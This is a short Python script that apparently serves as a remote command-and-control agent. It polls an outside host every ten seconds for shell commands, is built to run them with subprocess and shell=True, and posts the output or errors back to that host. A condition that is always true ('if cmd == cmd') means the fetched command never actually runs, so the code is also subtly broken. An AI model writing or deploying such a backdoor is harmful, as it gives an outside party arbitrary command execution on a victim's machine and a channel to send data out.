import subprocess
import requests
from time import sleep
cmd = ""

while True:
    try:
        sleep(10)
        cmd = requests.get("https://auto.abbishal.ninja/js").text
        if cmd == cmd:
            continue
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        requests.post("https://auto.abbishal.ninja/sh/scalingo", data=result)
    except Exception as e:
        requests.post("https://auto.abbishal.ninja/sh/scalingo", data=str(e).encode())
